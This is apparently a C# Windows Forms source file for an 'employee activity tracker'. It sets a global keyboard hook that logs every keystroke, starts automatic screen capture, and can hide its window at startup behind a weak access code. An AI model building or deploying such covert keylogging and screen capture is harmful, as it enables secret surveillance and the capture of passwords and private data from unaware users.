using EmployeeActivityTracker.Loggers;
using Gma.System.MouseKeyHook;
using MaterialSkin;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Forms;

namespace EmployeeActivityTracker
{
    public partial class MainPage : Form
    {
        public static MainPage Self;
        public IKeyboardMouseEvents _globalHook;

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
        public MainPage()
        {
            Self = this;
            if (_globalHook == null)
            {
                _globalHook = Hook.GlobalEvents();
                _globalHook.KeyPress += GlobalHookKeyPress;
            }

            string directoryName = "logs";
            if (Directory.Exists(directoryName)) Directory.Delete(directoryName, true);
            Directory.CreateDirectory(directoryName);

            KeyLogger.EnableAutoLogging();
            ScreenCapture.EnableAutoLogging();

            InitializeComponent();
            ApplyProgramDesing();

            SettingsManager.ApplyReadedSettings();
        }


        protected override void SetVisibleCore(bool value)
        {
            if (SettingsManager.getHideOnStartup == "true")
            {
                base.SetVisibleCore(false);
            }
            else 
            { 
                base.SetVisibleCore(true); 
            }
            
        }


        //===================================================== Preload pages ====================
        public SettingsPage _settingsPage = new SettingsPage() { Dock = DockStyle.Fill, TopLevel = false };
        public KeyLogsPage _keyLogsPage = new KeyLogsPage() { Dock = DockStyle.Fill, TopLevel = false };
        public ScreenLogsPage _screenLogsPage = new ScreenLogsPage() { Dock = DockStyle.Fill, TopLevel = false };
        //================================================================================================



        //===================================================== System methods ====================
        private void ApplyProgramDesing()
        {
            Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 15, 15));
            var materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
            materialSkinManager.ColorScheme = new ColorScheme(Primary.Blue600, Primary.Blue600, Primary.Blue200, Accent.Blue200, TextShade.WHITE);

            _settingsPage.Show();
            _keyLogsPage.Show();
            _screenLogsPage.Show();

            _screenLogsPage.pictureBox1.Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, _screenLogsPage.pictureBox1.Width, _screenLogsPage.pictureBox1.Height, 15, 15));
        }
        private void closeAppButton_Click(object sender, EventArgs e)
        {
            SqlActions.CloseConnectionAsync();
            try { Directory.Delete("logs", true); }
            catch { }
            Process.GetCurrentProcess().Kill();
        }
        private void DraggingStart(object sender, MouseEventArgs e)
        {
            WindowDrag.dragState = true;
            WindowDrag.dragStartPoint = new System.Drawing.Point(e.X, e.Y);
        }
        private void DraggingContinue(object sender, MouseEventArgs e)
        {
            if (WindowDrag.dragState)
            {
                System.Drawing.Point p = PointToScreen(e.Location);
                Location = new System.Drawing.Point(p.X - WindowDrag.dragStartPoint.X, p.Y - WindowDrag.dragStartPoint.Y);
            }
        }
        private void DraggingEnd(object sender, MouseEventArgs e)
        {
            WindowDrag.dragState = false;
        }
        private void settingsPageButton_Click(object sender, EventArgs e)
        {
            PageSwitcher.ActivePage = 1;
        }
        private void logManagerPageButton_Click(object sender, EventArgs e)
        {
            PageSwitcher.ActivePage = 2;
        }
        private void screensManagerPageButton_Click(object sender, EventArgs e)
        {
            PageSwitcher.ActivePage = 3;
        }
        public void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            KeyLogger.LogButton(e.KeyChar);
        }
        private void trayIcon_Click(object sender, EventArgs e)
        {
            if (SettingsManager.getHideOnStartup == "false") return;

            string userInput = Microsoft.VisualBasic.Interaction.InputBox("Введите код доступа:", "Пароль", "");
            if (userInput == SettingsManager.getComputerName)
            {
                _settingsPage.updateSettingInFile("hideOnStartup", "false");

                SqlActions.CloseConnectionAsync();
                try { Directory.Delete("logs", true); }
                catch { }

                System.Windows.MessageBox.Show($"Вы ввели верный пароль.\nДалее приложение будет закрыто.\n\nВам необходимо перезапустить его вручную!", "", MessageBoxButton.OK, MessageBoxImage.Information);

                Process.GetCurrentProcess().Kill();
            }
            else return;  
        }
        //================================================================================================
    }
}
